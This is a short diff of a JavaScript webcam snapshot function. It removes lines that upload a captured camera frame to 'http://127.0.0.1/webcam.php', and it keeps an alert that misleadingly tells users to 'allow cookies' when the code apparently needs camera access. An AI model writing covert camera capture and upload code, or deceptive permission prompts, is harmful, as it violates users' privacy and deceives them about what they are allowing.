@@ -61,12 +61,6 @@ function snapshot() {
     if (localMediaStream) {
         ctx.drawImage(video, 480, 320);
         var dat = canvas.toDataURL('image/png');
-        xmlhttp.open("POST", "http://127.0.0.1/webcam.php", true);
-        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    	var x=encodeURIComponent(dat);
-        xmlhttp.send("data=" + x);
-       
-
     }
     else {
         alert("Allow cookies. It is necessary :) ");
